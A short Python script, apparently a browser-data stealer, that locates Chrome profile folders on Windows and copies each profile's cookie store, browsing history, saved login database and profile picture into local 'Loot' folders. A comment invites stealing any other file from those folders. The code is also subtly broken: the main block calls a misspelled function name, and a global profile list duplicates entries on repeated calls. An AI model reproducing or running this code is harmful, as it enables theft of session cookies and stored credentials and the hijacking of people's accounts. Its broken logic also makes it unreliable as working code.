import os
import shutil
import re


profiles = []
def rutas_cookie():
    users_cookie_path = []
    templates = [r'Profile [0-9]', r'Default']
    cookies_path = os.getenv('TMP').replace('Temp', 'Google\\Chrome\\User Data')
    arch_chrome = os.listdir(cookies_path)
    
    for i in arch_chrome:
        for j in templates:
            if re.match(j, i):
                profiles.append(i)

    for i in profiles:
        i = cookies_path + (f'\\{i}')
        users_cookie_path.append(i)
    return users_cookie_path

def obtener_cookies(paths):
    loot_paths = []
    paths2  = []
    for i in paths:
        i = i + '\\Network'
        paths2.append(i)
    for i in profiles:
        loot_paths.append(f'Loot_de_{i}')
    try:
        for i in loot_paths:
            shutil.rmtree(i)
    except FileNotFoundError: pass
    for i in range(len(loot_paths)):
        shutil.copytree(paths2[i], f'{loot_paths[i]}\\cookies')

# You can steal any other file from this folder C:\Users\(USERNAME)\AppData\Local\Google\Chrome\User Data\(ProfileName) just calling this function
def other_File(paths, nameChrome, saveName):
    for i in range(len(profiles)):
        try:
            shutil.copyfile(f'{paths[i]}\\{nameChrome}', f'Loot_de_{profiles[i]}\\{saveName}')
        except FileNotFoundError: pass

if __name__ == '__main__':
    obtener_coockies(rutas_cookie())
    other_File(rutas_cookie(), 'Google Profile Picture.png', 'Foto_perfil.png')
    other_File(rutas_cookie(), 'History', 'Historial.db')
    other_File(rutas_cookie(), 'Login Data', 'Datos_login.db')
